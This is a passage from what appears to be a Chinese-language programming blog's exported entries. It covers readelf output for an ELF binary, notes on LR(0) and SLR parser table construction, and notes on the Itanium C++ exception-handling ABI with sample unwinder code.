.shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">00003580</span></span><br><span class="line">       <span class="number">000000000000011</span>a  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  PHDR           <span class="number">0x0000000000000040</span> <span class="number">0x0000000000000040</span> <span class="number">0x0000000000000040</span></span><br><span class="line">                 <span class="number">0x00000000000002d8</span> <span class="number">0x00000000000002d8</span>  R      <span class="number">0x8</span></span><br><span class="line">  INTERP         <span class="number">0x0000000000000318</span> <span class="number">0x0000000000000318</span> <span class="number">0x0000000000000318</span></span><br><span class="line">                 <span class="number">0x000000000000001c</span> <span class="number">0x000000000000001c</span>  R      <span class="number">0x1</span></span><br><span class="line">      [Requesting program interpreter: /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>]</span><br><span class="line">  LOAD           <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line">                 <span class="number">0x0000000000000628</span> <span class="number">0x0000000000000628</span>  R      <span class="number">0x1000</span></span><br><span class="line">  LOAD           <span class="number">0x0000000000001000</span> <span class="number">0x0000000000001000</span> <span class="number">0x0000000000001000</span></span><br><span class="line">                 <span class="number">0x0000000000000185</span> <span class="number">0x0000000000000185</span>  R E    <span class="number">0x1000</span></span><br><span class="line">  LOAD           <span class="number">0x0000000000002000</span> <span class="number">0x0000000000002000</span> <span class="number">0x0000000000002000</span></span><br><span class="line">                 <span class="number">0x00000000000000ec</span> <span class="number">0x00000000000000ec</span>  R      <span class="number">0x1000</span></span><br><span class="line">  LOAD           <span class="number">0x0000000000002db8</span> <span class="number">0x0000000000003db8</span> <span class="number">0x0000000000003db8</span></span><br><span class="line">                 <span class="number">0x0000000000000258</span> <span class="number">0x0000000000000260</span>  RW     <span class="number">0x1000</span></span><br><span class="line">  DYNAMIC        <span class="number">0x0000000000002dc8</span> <span class="number">0x0000000000003dc8</span> <span class="number">0x0000000000003dc8</span></span><br><span class="line">                 <span class="number">0x00000000000001f0</span> <span class="number">0x00000000000001f0</span>  RW     <span class="number">0x8</span></span><br><span class="line">  NOTE           <span class="number">0x0000000000000338</span> <span class="number">0x0000000000000338</span> <span class="number">0x0000000000000338</span></span><br><span class="line">                 <span class="number">0x0000000000000030</span> <span class="number">0x0000000000000030</span>  R      <span class="number">0x8</span></span><br><span class="line">  NOTE           <span class="number">0x0000000000000368</span> <span class="number">0x0000000000000368</span> <span class="number">0x0000000000000368</span></span><br><span class="line">                 <span class="number">0x0000000000000044</span> <span class="number">0x0000000000000044</span>  R      <span class="number">0x4</span></span><br><span class="line">  GNU_PROPERTY   <span class="number">0x0000000000000338</span> <span class="number">0x0000000000000338</span> <span class="number">0x0000000000000338</span></span><br><span class="line">                 <span class="number">0x0000000000000030</span> <span class="number">0x0000000000000030</span>  R      <span class="number">0x8</span></span><br><span class="line">  GNU_EH_FRAME   <span class="number">0x0000000000002008</span> <span class="number">0x0000000000002008</span> <span class="number">0x0000000000002008</span></span><br><span class="line">                 <span class="number">0x0000000000000034</span> <span class="number">0x0000000000000034</span>  R      <span class="number">0x4</span></span><br><span class="line">  GNU_STACK      <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line">                 <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span>  RW     <span class="number">0x10</span></span><br><span class="line">  GNU_RELRO      <span class="number">0x0000000000002db8</span> <span class="number">0x0000000000003db8</span> <span class="number">0x0000000000003db8</span></span><br><span class="line">                 <span class="number">0x0000000000000248</span> <span class="number">0x0000000000000248</span>  R      <span class="number">0x1</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>cs</category>
        <category>读书笔记</category>
        <category>ELF</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>linker</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/05/algorithm/%E5%9B%BE%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>关于parser的语法树生成算法（实现）</title>
    <url>/2024/08/01/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86paser%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Week-5-and-Week-6"><a href="#Week-5-and-Week-6" class="headerlink" title="Week 5 and Week 6"></a>Week 5 and Week 6</h2><blockquote>
<p>首先是提出算法实现前的一些铺垫，主要包括以下知识：</p>
<p>1.Top-Down and Bottom-Up</p>
<p>2.Shift-Reduce Parsing</p>
<p>3.一些notation为了算法实现做铺垫</p>
</blockquote>
<h3 id="1-Top-Down-and-Bottom-Up"><a href="#1-Top-Down-and-Bottom-Up" class="headerlink" title="1.Top-Down and Bottom-Up"></a>1.Top-Down and Bottom-Up</h3><p>Top-Down对应先前讲的leftmost，而Bottom-Up则对应先前讲的rightmost，Week 4是从易于理解的角度讲解，而本周则是从实现的角度讲解。主要涉及到了如何shift，如何reduce，以及如何生成树，但是没有讲什么时候。</p>
<h3 id="2-Shift-Reduce-Parsing"><a href="#2-Shift-Reduce-Parsing" class="headerlink" title="2.Shift-Reduce Parsing"></a>2.Shift-Reduce Parsing</h3><p>基于Top-Down and Bottom-Up引出的语法解析实现的简单模型，初步引入了一些notation，如</p>
<p><img src="/img/mypic/com/192717-17226163867168.png" alt="192717"></p>
<p>主要解决了在哪reduce的问题<img src="/img/mypic/com/192952-17226163831407.png" alt="192952"></p>
<p>期间讲了一个插曲，也就是冲突（conflict）的解决方法：</p>
<p>一个为：shift和reduce的冲突，可被precedence and associativity declaration修复，类似于leftmost 或者rightmost，如加法和乘法的优先级。</p>
<p>另一个： reduce-reduce conflict，不知道该选择哪一个规则，说明： There is ambiguity in the grammar ，Might be fixed by additional lookahead，这个类似于两个规则冲突</p>
<h3 id="3-When-to-shift-reduce"><a href="#3-When-to-shift-reduce" class="headerlink" title="3.When to shift&#x2F;reduce?"></a>3.When to shift&#x2F;reduce?</h3><p>接着讲什么时候解决冲突，主要引入了prefix and handle</p>
<p><img src="/img/mypic/com/193651-17226163759036.png" alt="193651-17226163759036"></p>
<p>然后将了语法规范（specific）和parser的关系，核心在这张图：基本观点是，规范越简单解析器越简单，解析器无法准确识别所用的上下文无关语法（CFG），解析器的实现也需要效率和功能的trade-off</p>
<p><img src="/img/mypic/com/193848-17226163733105.png" alt="193848-17226163733105"></p>
<h3 id="3-When-to-shift-reduce-realize"><a href="#3-When-to-shift-reduce-realize" class="headerlink" title="3.When to shift&#x2F;reduce?realize"></a>3.When to shift&#x2F;reduce?realize</h3><h4 id="algorithm-1（LR0）"><a href="#algorithm-1（LR0）" class="headerlink" title="algorithm 1（LR0）"></a>algorithm 1（LR0）</h4><blockquote>
<p>关键在于构造action和goto两张表格</p>
<p>构造上述两张表格需要知道Configuration set</p>
<p>构造configuration set需要知道如何计算Closure property</p>
</blockquote>
<ul>
<li><p>action和goto表格的状态转移可看下表：</p>
<p>只需要注意一点的就是其状态转移只和stack头的元素有关，当弹出元素之后的状态转移也是如此</p>
<p><img src="/img/mypic/com/235730.png" alt="235730"></p>
</li>
<li><p>closure的构造</p>
<p>把所有的非终结符递归的转换即可</p>
<p><img src="/img/mypic/com/000108-17226163667684.png" alt="2024-08-03 000108-17226163667684"></p>
</li>
<li><p>Successor(I, X)的构造</p>
<blockquote>
<p>类似于状态转移后的状态的构造，状态转移需要移动圆点</p>
</blockquote>
<p><img src="/img/mypic/com/image-20240803000246178.png" alt="image-20240803000246178"></p>
</li>
<li><p>configuration set的构造</p>
<p><img src="/img/mypic/com/image-20240803000332150-17226163592833.png" alt="image-20240803000332150"></p>
</li>
<li><p>action和goto的表格获得</p>
<p><img src="/img/mypic/com/image-20240803000701647-17226163557042.png" alt="image-20240803000701647"></p>
</li>
<li><p>需要注意的地方</p>
<blockquote>
<p>1.状态不要重复，状态也不能少</p>
<p>2.若出现冲突说明grammar定义的不好</p>
</blockquote>
<p>如此例子：则出现了reduce和shift冲突和reduce和reduce冲突，注意有的并非冲突，可以一个状态多次操作</p>
<p><img src="/img/mypic/com/image-20240803000826163-17226162670141.png" alt="image-20240803000826163"></p>
<p><img src="/img/mypic/com/image-20240803001104451.png" alt="image-20240803001104451"></p>
</li>
</ul>
<h4 id="algorithm-2（SLR1）"><a href="#algorithm-2（SLR1）" class="headerlink" title="algorithm 2（SLR1）"></a>algorithm 2（SLR1）</h4><blockquote>
<p>关键在于知道first（X）和follow（X）的定义，进而shift操作和reduce操作以及reduce-reduce的conflict都可以从follow（X）的定义解决，当然也有语法不满足的情况。</p>
<p>总结就是通过可以观察即将输入的terminal来判断是否执行push操作，或者直接执行reduce操作，因此称为SLR1，然后再根据执行操作后入栈的元素来实现状态转移，也就是说在入栈的那一刻状态也转移了，栈顶存储的就是此时的state</p>
<p>需注意一次状态一次操作，即state-&gt;action-&gt;new_state(根据action后的栈顶元素决定)</p>
</blockquote>
<ul>
<li><p>例子：在reduce阶段可以认为是（pop+push）然后进入新状态。</p>
<p><img src="/img/mypic/com/image-20240803224138802.png" alt="image-20240803224138802"></p>
</li>
</ul>
<h4 id="algorithm-3（SLR）"><a href="#algorithm-3（SLR）" class="headerlink" title="algorithm 3（SLR）"></a>algorithm 3（SLR）</h4><blockquote>
<p>讲看follow来构造configuration set改为根据看lookahead，更加细粒化，其他没有什么不一样的</p>
</blockquote>
<h3 id="5-优先级precedence"><a href="#5-优先级precedence" class="headerlink" title="5.优先级precedence"></a>5.优先级precedence</h3><blockquote>
<p>不是通过更改语法来实现，而是给算法增加额外规则，也就是人为增加何时reduce or shift，以减少此类冲突情形。</p>
</blockquote>
]]></content>
      <categories>
        <category>cs</category>
        <category>compiler</category>
      </categories>
      <tags>
        <tag>cs</tag>
        <tag>compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>内存分配</title>
    <url>/2024/09/11/linux%E5%86%85%E6%A0%B8/%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>linux内核</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/03/ABI/c++%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<blockquote>
<p>以Itanium C++ ABI为例子，其为类unix操作系统普遍使用的c++ABI标准</p>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#base-framework">https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#base-framework</a></p>
<p><a href="https://maskray.me/blog/2020-12-12-c++-exception-handling-abi#%E4%B8%AD%E6%96%87%E7%89%88">https://maskray.me/blog/2020-12-12-c++-exception-handling-abi#%E4%B8%AD%E6%96%87%E7%89%88</a></p>
<h2 id="一-BASE-ABI"><a href="#一-BASE-ABI" class="headerlink" title="一.BASE ABI"></a>一.BASE ABI</h2><blockquote>
<p>所有语言和实现通用的接口;感觉写的很混乱就做个参考吧</p>
</blockquote>
<h3 id="1-符合psABI架构的处理器的运行时库需要提供的接口"><a href="#1-符合psABI架构的处理器的运行时库需要提供的接口" class="headerlink" title="1.符合psABI架构的处理器的运行时库需要提供的接口"></a>1.符合psABI架构的处理器的运行时库需要提供的接口</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_Unwind_RaiseException,</span><br><span class="line">_Unwind_Resume,</span><br><span class="line">_Unwind_DeleteException,</span><br><span class="line">_Unwind_GetGR,</span><br><span class="line">_Unwind_SetGR,</span><br><span class="line">_Unwind_GetIP,</span><br><span class="line">_Unwind_SetIP,</span><br><span class="line">_Unwind_GetRegionStart,</span><br><span class="line">_Unwind_GetLanguageSpecificData,</span><br><span class="line">_Unwind_ForcedUnwind</span><br></pre></td></tr></table></figure>

<p>另外，定义了两种数据类型（_Unwind_Context 和 _Unwind_Exception），用于连接调用运行时（如 C++ 运行时）与上述例程的接口。所有例程和接口的行为都如同是用 <code>extern &quot;C&quot;</code> 定义的一样，特别是这些名称不会被修饰。作为此接口的一部分，所有定义的名称都以 “<em>Unwind</em>“ 作为前缀。</p>
<p>最后，编译器会在需要异常处理的栈帧的展开描述符中存储一个语言和供应商特定的 personality 函数。展开器（unwinder）会调用 personality 函数来处理特定语言的任务，例如识别处理特定异常的栈帧。</p>
<h3 id="2-Data-Structures详解"><a href="#2-Data-Structures详解" class="headerlink" title="2.Data Structures详解"></a>2.Data Structures详解</h3><h4 id="Reason-Codes"><a href="#Reason-Codes" class="headerlink" title="Reason Codes"></a><strong>Reason Codes</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">	_URC_NO_REASON = <span class="number">0</span>,</span><br><span class="line">	_URC_FOREIGN_EXCEPTION_CAUGHT = <span class="number">1</span>,</span><br><span class="line">	_URC_FATAL_PHASE2_ERROR = <span class="number">2</span>,</span><br><span class="line">	_URC_FATAL_PHASE1_ERROR = <span class="number">3</span>,</span><br><span class="line">	_URC_NORMAL_STOP = <span class="number">4</span>,</span><br><span class="line">	_URC_END_OF_STACK = <span class="number">5</span>,</span><br><span class="line">	_URC_HANDLER_FOUND = <span class="number">6</span>,</span><br><span class="line">	_URC_INSTALL_CONTEXT = <span class="number">7</span>,</span><br><span class="line">	_URC_CONTINUE_UNWIND = <span class="number">8</span></span><br><span class="line">    &#125; _Unwind_Reason_Code;</span><br></pre></td></tr></table></figure>

<h4 id="Exception-Header"><a href="#Exception-Header" class="headerlink" title="Exception Header"></a><strong>Exception Header</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*_Unwind_Exception_Cleanup_Fn)</span></span><br><span class="line">		<span class="params">(_Unwind_Reason_Code reason,</span></span><br><span class="line"><span class="params">		 <span class="keyword">struct</span> _Unwind_Exception *exc)</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> &#123;</span></span><br><span class="line">    uint64			 exception_class; <span class="comment">//特定语言和实现的标识符， It allows a personality routine to distinguish between native and foreign exceptions</span></span><br><span class="line">    _Unwind_Exception_Cleanup_Fn exception_cleanup; <span class="comment">//当异常对象被删除会调用此</span></span><br><span class="line">    uint64			 private_1; <span class="comment">// 存储内部信息</span></span><br><span class="line">    uint64			 private_2; <span class="comment">// 存储内部信息</span></span><br><span class="line">&#125;;</span><br><span class="line">展开器（unwinder）在处理异常时，通过这个头部来识别和管理异常对象，确保在异常处理完毕后正确地释放资源。</span><br></pre></td></tr></table></figure>

<h4 id="Unwind-Context"><a href="#Unwind-Context" class="headerlink" title="Unwind Context"></a><strong>Unwind Context</strong></h4><h3 id="3-Throwing-an-Exception1"><a href="#3-Throwing-an-Exception1" class="headerlink" title="3.Throwing an Exception1"></a>3.Throwing an Exception1</h3><blockquote>
<p><strong>查找异常处理器</strong>：先查找是否有栈帧可以处理异常（阶段 1）。</p>
<p><strong>展开栈与清理</strong>：如果找到处理器，则沿着调用栈展开并执行清理操作（阶段 2）。</p>
<p>此函数是两阶段的结合。</p>
</blockquote>
<blockquote>
<p><code>_Unwind_RaiseException</code> 是一个函数，用于抛出一个异常。它会接收一个异常对象作为参数，这个异常对象必须包含一个已设置的 <code>exception_class</code> 字段和 <code>exception_cleanup</code> 字段。这些字段在抛出异常之前由特定语言的运行时设置。</p>
<p>异常对象通常是由特定语言的运行时（如 C++ 的运行时）分配和初始化的。尽管这个异常对象的结构可以根据不同的语言有所不同，但它必须包含一个 <code>_Unwind_Exception</code> 结构体，作为异常处理过程的基础部分。</p>
<p>只有在发生错误时， <code>_Unwind_RaiseException</code> 才会返回。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_Unwind_Reason_Code _Unwind_RaiseException</span><br><span class="line">	      ( <span class="keyword">struct</span> _Unwind_Exception *exception_object );</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可能遇到的部分错误码：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_URC_END_OF_STACK：展开器在阶段 <span class="number">1</span> 中遇到了堆栈的末尾，但没有找到处理程序。展开运行时不会修改堆栈。在这种情况下，C++运行时通常会调用 uncaught_exception（）。</span><br><span class="line">_URC_FATAL_PHASE1_ERROR：展开器在阶段 <span class="number">1</span> 中遇到意外错误，例如堆栈损坏。展开运行时不会修改堆栈。在这种情况下，C++ 运行时通常会调用 <span class="built_in">terminate</span>（）。</span><br><span class="line">   如果展开器在第 <span class="number">2</span> 阶段遇到意外错误，则应将 _URC_FATAL_PHASE2_ERROR 返回给其调用方。 在 C++ 中，这通常是 __cxa_throw，它将调用 <span class="built_in">terminate</span>（）。</span><br></pre></td></tr></table></figure>

<h3 id="3-Throwing-an-Exception2"><a href="#3-Throwing-an-Exception2" class="headerlink" title="3.Throwing an Exception2"></a>3.Throwing an Exception2</h3><blockquote>
<p>此部分主要用于资源清理。而非异常处理，只有一个阶段，那就是栈展开，没有search操作</p>
<p>具体细节，用时再说</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> _Unwind_Reason_Code (*_Unwind_Stop_Fn)</span><br><span class="line">		(<span class="type">int</span> version,</span><br><span class="line">		 _Unwind_Action actions,</span><br><span class="line">		 uint64 exceptionClass,</span><br><span class="line">		 <span class="keyword">struct</span> _Unwind_Exception *exceptionObject,</span><br><span class="line">		 <span class="keyword">struct</span> _Unwind_Context *context,</span><br><span class="line">		 <span class="type">void</span> *stop_parameter );</span><br><span class="line"></span><br><span class="line">    _Unwind_Reason_Code _Unwind_ForcedUnwind</span><br><span class="line">	      ( <span class="keyword">struct</span> _Unwind_Exception *exception_object,</span><br><span class="line">		_Unwind_Stop_Fn stop,</span><br><span class="line">		<span class="type">void</span> *stop_parameter );</span><br></pre></td></tr></table></figure>

<h3 id="3-1-Unwind-Resume"><a href="#3-1-Unwind-Resume" class="headerlink" title="3.1_Unwind_Resume"></a>3.1_Unwind_Resume</h3><blockquote>
<p>对异常处理的第二阶段的补充，用于恢复异常的传播，如多个catch捕捉异常</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _Unwind_Resume (<span class="keyword">struct</span> _Unwind_Exception *exception_object);</span><br></pre></td></tr></table></figure>

<h3 id="4-Exception-Object-Management"><a href="#4-Exception-Object-Management" class="headerlink" title="4.Exception Object Management"></a>4.Exception Object Management</h3><h4 id="4-1-Unwind-DeleteException"><a href="#4-1-Unwind-DeleteException" class="headerlink" title="4.1_Unwind_DeleteException"></a>4.1_Unwind_DeleteException</h4><blockquote>
<p>这个函数会调用 <code>exception_object</code> 结构体中的 <code>exception_cleanup</code> 函数指针，执行特定语言或实现的清理操作，以确保异常对象中可能占用的资源（如动态分配的内存）被正确释放。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _Unwind_DeleteException</span><br><span class="line">	      (<span class="keyword">struct</span> _Unwind_Exception *exception_object);</span><br></pre></td></tr></table></figure>

<h3 id="5-Context-Management"><a href="#5-Context-Management" class="headerlink" title="5.Context Management"></a>5.Context Management</h3><blockquote>
<p>用于返回栈帧与寄存器信息</p>
</blockquote>
<h3 id="6-Personality-Routine"><a href="#6-Personality-Routine" class="headerlink" title="6. Personality Routine"></a>6. Personality Routine</h3><blockquote>
<p>对底层baseABI的封装，通过展开信息块的指针来引用。</p>
<h5 id="Transferring-Control-to-a-Landing-Pad：通过上下文保存的指针"><a href="#Transferring-Control-to-a-Landing-Pad：通过上下文保存的指针" class="headerlink" title="Transferring Control to a Landing Pad：通过上下文保存的指针"></a>Transferring Control to a Landing Pad：通过上下文保存的指针</h5></blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_Unwind_Reason_Code (*__personality_routine)</span><br><span class="line"> (<span class="type">int</span> version,</span><br><span class="line">  _Unwind_Action actions, <span class="comment">//action</span></span><br><span class="line">  uint64 exceptionClass, <span class="comment">//类型</span></span><br><span class="line">  <span class="keyword">struct</span> _Unwind_Exception *exceptionObject,</span><br><span class="line">  <span class="keyword">struct</span> _Unwind_Context *context);</span><br></pre></td></tr></table></figure>

<h2 id="二-C-ABI"><a href="#二-C-ABI" class="headerlink" title="二 C++ABI"></a>二 C++ABI</h2><h3 id="1-Data-Structures"><a href="#1-Data-Structures" class="headerlink" title="1. Data Structures"></a>1. Data Structures</h3><h4 id="Caught-Exception-Stack"><a href="#Caught-Exception-Stack" class="headerlink" title="Caught Exception Stack"></a>Caught Exception Stack</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">cxa_eh_globals</span> &#123;</span></span><br><span class="line">__cxa_exception *	caughtExceptions;<span class="comment">//当前线程引发和捕获的异常列表</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>		uncaughtExceptions; <span class="comment">//未捕获的异常计数</span></span><br><span class="line">     &#125;;</span><br></pre></td></tr></table></figure>

<h4 id="C-Exception-Objects"><a href="#C-Exception-Objects" class="headerlink" title="C++ Exception Objects"></a>C++ Exception Objects</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">cxa_exception</span> &#123;</span> </span><br><span class="line"><span class="built_in">std</span>::type_info *	exceptionType;</span><br><span class="line"><span class="type">void</span> (*exceptionDestructor) (<span class="type">void</span> *); </span><br><span class="line">unexpected_handler	unexpectedHandler;</span><br><span class="line">terminate_handler	terminateHandler;</span><br><span class="line">__cxa_exception *	nextException;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>			handlerCount;</span><br><span class="line"><span class="type">int</span>			handlerSwitchValue;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *		actionRecord;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *		languageSpecificData;</span><br><span class="line"><span class="type">void</span> *			catchTemp;</span><br><span class="line"><span class="type">void</span> *			adjustedPtr;</span><br><span class="line"></span><br><span class="line">_Unwind_Exception	unwindHeader;</span><br><span class="line">     &#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2-过程（算法）"><a href="#2-过程（算法）" class="headerlink" title="2.过程（算法）"></a>2.过程（算法）</h3><h4 id="Throwing-an-Exception"><a href="#Throwing-an-Exception" class="headerlink" title="Throwing an Exception"></a>Throwing an Exception</h4><h5 id="1-Allocating-the-Exception-Object"><a href="#1-Allocating-the-Exception-Object" class="headerlink" title="1.Allocating the Exception Object"></a>1.Allocating the Exception Object</h5><blockquote>
<p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#base-personality">https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#base-personality</a></p>
<p>调用：void *__cxa_allocate_exception(size_t thrown_size);</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">+---------------------+----------------------+</span><br><span class="line">| __cxa_exception 标头 |  实际的异常对象数据  |</span><br><span class="line">+---------------------+----------------------+</span><br><span class="line">^                     ^</span><br><span class="line">|                     |</span><br><span class="line">|                     +-- 通过 __cxa_allocate_exception 返回的指针</span><br><span class="line">|</span><br><span class="line">+-- 标头起始地址，通常通过从异常对象指针减去一个固定偏移量得到</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="2-Throwing-the-Exception-Object"><a href="#2-Throwing-the-Exception-Object" class="headerlink" title="2.Throwing the Exception Object"></a>2.Throwing the Exception Object</h5><blockquote>
<p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#base-personality">https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#base-personality</a></p>
<p>调用： void __cxa_throw (void *thrown_exception, std::type_info *tinfo, void (*dest) (void *) );This routine never returns.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="comment">/*获得标头*/</span></span><br><span class="line">__cxa_exception *header = ((__cxa_exception *) thrown_exception - <span class="number">1</span>);</span><br><span class="line"><span class="number">2.</span><span class="comment">/*将当前 unexpected_handler 和 terminate_handler 保存在 __cxa_exception 标头中。*/</span></span><br><span class="line"><span class="number">3.</span><span class="comment">/*将 tinfo 和 dest 参数保存在 __cxa_exception 标头中。*/</span></span><br><span class="line"><span class="number">4.</span><span class="comment">/*在 unwind 标头中设置 exception_class 字段。这是一个 64 位值，表示 ASCII 字符串 “XXXXC++\0”，其中 “XXXX” 是与供应商相关的字符串。也就是说，对于符合此 ABI 的实现，此 64 位值的低序 4 字节将为“C++\0”。*/</span></span><br><span class="line"><span class="number">5.</span><span class="comment">/*递增 uncaught_exception 标志。*/</span>    </span><br><span class="line"><span class="comment">//简化实现</span></span><br><span class="line"><span class="type">void</span> __cxa_throw(<span class="type">void</span> *thrown, <span class="built_in">std</span>::type_info *tinfo, <span class="type">void</span> (*destructor)(<span class="type">void</span> *)) &#123;</span><br><span class="line">  __cxa_exception *hdr = (__cxa_exception *)thrown - <span class="number">1</span>;</span><br><span class="line">  hdr-&gt;exceptionType = tinfo; hdr-&gt;destructor = destructor;</span><br><span class="line">  hdr-&gt;unexpectedHandler = <span class="built_in">std</span>::get_unexpected();</span><br><span class="line">  hdr-&gt;terminateHandler = <span class="built_in">std</span>::get_terminate();</span><br><span class="line">  hdr-&gt;unwindHeader.exception_class = ...;</span><br><span class="line">  __cxa_get_globals()-&gt;uncaughtExceptions++;</span><br><span class="line">  _Unwind_RaiseException(&amp;hdr-&gt;unwindHeader);</span><br><span class="line">  <span class="comment">// Failed to unwind, e.g. the .eh_frame FDE is absent.</span></span><br><span class="line">  __cxa_begin_catch(&amp;hdr-&gt;unwindHeader);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">terminate</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-Unwind-RaiseException"><a href="#3-Unwind-RaiseException" class="headerlink" title="3._Unwind_RaiseException"></a>3._Unwind_RaiseException</h5><blockquote>
<p>此过程是baseabi的throw的两阶段。会调用此函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_Unwind_Reason_Code (*__personality_routine)</span><br><span class="line">    (<span class="type">int</span> version,</span><br><span class="line">     _Unwind_Action actions,</span><br><span class="line">     uint64 exceptionClass,</span><br><span class="line">     <span class="keyword">struct</span> _Unwind_Exception *exceptionObject,</span><br><span class="line">     <span class="keyword">struct</span> _Unwind_Context *context);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>phase1</p>
</blockquote>
<blockquote>
<p>会通过光标来寻找<code>__personality_routine</code>,找到则进行调用，根据返回值是否找到hander来进行下一步操作（返回，或者继续展开），若返回的话那么<code>_Unwind_Exception</code>的private_2则会记住栈指针，指向具体的catch块的位置，以便于正确使用变量。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> _Unwind_Reason_Code</span><br><span class="line"><span class="title function_">unwind_phase1</span><span class="params">(<span class="type">unw_context_t</span> *uc, <span class="type">unw_cursor_t</span> *cursor, _Unwind_Exception *exception_object)</span> &#123;</span><br><span class="line">  __unw_init_local(cursor, uc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Walk each frame looking for a place to stop.</span></span><br><span class="line">  <span class="type">bool</span> handlerNotFound = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">while</span> (handlerNotFound) &#123;</span><br><span class="line">    <span class="comment">// Ask libunwind to get next frame (skip over first which is</span></span><br><span class="line">    <span class="comment">// _Unwind_RaiseException).</span></span><br><span class="line">    <span class="type">int</span> stepResult = __unw_step(cursor);</span><br><span class="line">    <span class="keyword">if</span> (stepResult == <span class="number">0</span>) &#123;</span><br><span class="line">      _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">          <span class="string">&quot;unwind_phase1(ex_ojb=%p): __unw_step() reached &quot;</span></span><br><span class="line">          <span class="string">&quot;bottom =&gt; _URC_END_OF_STACK&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)exception_object);</span><br><span class="line">      <span class="keyword">return</span> _URC_END_OF_STACK;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stepResult &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">          <span class="string">&quot;unwind_phase1(ex_ojb=%p): __unw_step failed =&gt; &quot;</span></span><br><span class="line">          <span class="string">&quot;_URC_FATAL_PHASE1_ERROR&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)exception_object);</span><br><span class="line">      <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// See if frame has code to run (has personality routine).</span></span><br><span class="line">    <span class="type">unw_proc_info_t</span> frameInfo;</span><br><span class="line">    <span class="type">unw_word_t</span> sp;</span><br><span class="line">    <span class="keyword">if</span> (__unw_get_proc_info(cursor, &amp;frameInfo) != UNW_ESUCCESS) &#123;</span><br><span class="line">      